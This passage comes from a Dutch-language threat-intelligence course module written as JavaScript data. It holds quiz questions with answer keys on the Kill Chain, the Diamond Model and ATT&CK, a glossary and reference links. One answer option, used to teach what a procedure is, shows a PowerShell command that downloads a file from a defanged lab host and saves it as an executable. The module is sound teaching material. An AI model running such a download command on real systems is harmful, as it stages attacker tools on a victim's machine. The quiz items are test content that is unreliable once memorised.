          wrong: { 0: 'De dader is een conclusie, geen waarneming. Wat is waargenomen, is gedeelde malware.', 2: 'De casus zegt dat de C2-servers niets gemeen hebben. Malware is Capability, niet Infrastructure.', 3: 'De achterdeur is een gedeeld kenmerk, en omdat hij niet eerder is beschreven ook een zeldzaam kenmerk.' },
          explain: 'Malware is Capability. Een zeldzame, gedeelde capability is een goede reden om te bundelen; attributie aan een dader vraagt meer.' },
        { q: 'Nadat een medewerker een macro heeft ingeschakeld en er een dienst is geïnstalleerd, ziet de firewall dat het werkstation elke vijf minuten een korte verbinding opzet naar dezelfde externe host. Bij welke fase van de Cyber Kill Chain hoort dat verkeer?',
          options: ['Exploitation', 'Installation', 'Command and Control', 'Actions on Objectives'], answer: 2,
          wrong: { 0: 'Exploitation was het uitvoeren van de macro. Dat is al gebeurd.', 1: 'Installation was het installeren van de dienst. Het periodieke verkeer komt daarna.', 3: 'Er wordt nog niets gestolen of vernield; het systeem meldt zich alleen en wacht op opdrachten.' },
          explain: 'Regelmatig, kort verkeer naar één host is een beacon: de besmette machine houdt contact met de aanvaller.' },
        { q: 'Een rapport beschrijft: "De aanvaller haalde een tweede bestand binnen." Een analist wil dit vastleggen als tactiek, techniek en procedure. Welke van de volgende is de procedure?',
          options: ['Command and Control', 'T1105 Ingress Tool Transfer', 'powershell.exe Invoke-WebRequest -Uri hxxp://update-check[.]nm[.]lab/l.bin -OutFile C:\\Users\\Public\\u.exe', 'PowerShell'], answer: 2,
          wrong: { 0: 'Dat is de tactiek: het doel van de stap.', 1: 'Dat is de techniek: de manier, in algemene termen.', 3: 'Dat is het gereedschap. Een procedure beschrijft hoe het precies is gebruikt.' },
          explain: 'De procedure is de concrete uitvoering: welk commando, met welke opties, naar welk pad. Op dat niveau schrijf je een detectieregel.' },
      ],
    },
  ],
  terms: [
    { term: 'Cyber Kill Chain', def: 'Zevenstappenmodel van Lockheed Martin (2011) dat een aanval beschrijft van verkenning tot het bereiken van het doel; verbreek je één schakel, dan mislukt de aanval.' },
    { term: 'Weaponization', def: 'De tweede Kill Chain-fase: de aanvaller maakt zijn wapen klaar, bijvoorbeeld een kwaadaardig document met een exploit, nog bij zichzelf.' },
    { term: 'MITRE ATT&CK', def: 'Openbare kennisbank van aanvalsgedrag, geordend in tactieken (waarom) en technieken (hoe) met vaste ID\'s zoals T1566.' },
    { term: 'Tactiek (ATT&CK)', def: 'Het doel van de aanvaller in een stap, bijvoorbeeld Credential Access. ATT&CK Enterprise kent er 14.' },
    { term: 'Techniek en sub-techniek', def: 'De manier waarop een aanvaller een tactiek bereikt, met een ID als T1059; een sub-techniek krijgt er een punt bij, zoals T1059.001 (PowerShell).' },
    { term: 'Procedure', def: 'De precieze, concrete uitvoering van een techniek door een bepaalde groep: welke tool, welke commando\'s en opties.' },
    { term: 'ATT&CK Navigator', def: 'Gratis webtool om de ATT&CK-matrix in te kleuren als heatmap, bijvoorbeeld om detectiedekking of blinde vlekken te tonen.' },
    { term: 'Diamond Model', def: 'Model dat één gebeurtenis beschrijft met vier hoekpunten: Adversary, Capability, Infrastructure en Victim, plus meta-kenmerken.' },
    { term: 'Meta-kenmerken', def: 'Extra gegevens rond een diamant, zoals tijd, fase, resultaat, methode en de herkomst en betrouwbaarheid van elk gegeven.' },
    { term: 'Activity thread', def: 'Een reeks samenhangende gebeurtenissen (diamanten) van begin tot eind, die je naast de Kill Chain-fasen kunt leggen.' },
    { term: 'Activity group', def: 'Een bundel diamanten die kenmerken delen; het begin van een campagne- of dadergroep. Je bouwt hem op door te pivoten langs gedeelde hoekpunten.' },
    { term: 'Pyramid of Pain', def: 'Model van David Bianco: hoe hoger (van hashes tot TTP\'s) je een aanvaller detecteert, hoe meer moeite het hem kost om eromheen te werken.' },
  ],
  resources: [
    { title: 'MITRE ATT&CK', url: 'https://attack.mitre.org/' },
    { title: 'Lockheed Martin — The Cyber Kill Chain', url: 'https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html' },
    { title: 'The Diamond Model of Intrusion Analysis (Caltagirone, Pendergast, Betz)', url: 'https://www.activeresponse.org/wp-content/uploads/2013/07/diamond.pdf' },
    { title: 'David Bianco — The Pyramid of Pain', url: 'https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html' },
  ],
});
